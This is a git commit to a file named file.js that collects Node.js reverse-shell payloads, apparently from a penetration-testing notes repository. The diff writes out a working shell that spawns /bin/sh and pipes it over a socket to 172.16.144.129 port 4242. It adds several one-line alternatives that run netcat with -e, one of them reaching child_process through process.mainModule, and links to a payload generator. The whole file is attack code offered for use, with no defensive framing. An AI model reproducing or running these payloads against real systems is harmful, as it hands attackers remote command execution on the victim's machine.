42588880bff03d19b340118e4634b10aee7e6055
matrix_0wl <101646824+matrix-0wl@users.noreply.github.com>
2025-03-06 19:48:56 +0100

    Update file.js

--- file.js
+++ file.js
@@ -1,16 +1,27 @@
 (function(){
-    var net = require('net'),
-        cp = require('child_process'),
+    var net = require("net"),
+        cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
-
-    var client = new net.Socket()
-    var IP = "172.16.144.129"
-    client.connect(1234, IP, function(){
-
+    var client = new net.Socket();
+    client.connect(4242, "172.16.144.129", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
-
     });
-    return /0/;
+    return /a/; // Prevents the Node.js application from crashing
 })();
+
+
+or
+
+require('child_process').exec('nc -e /bin/sh 172.16.144.129 4242')
+
+or
+
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc 172.16.144.129 4242 -e /bin/bash')
+
+or
+
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+
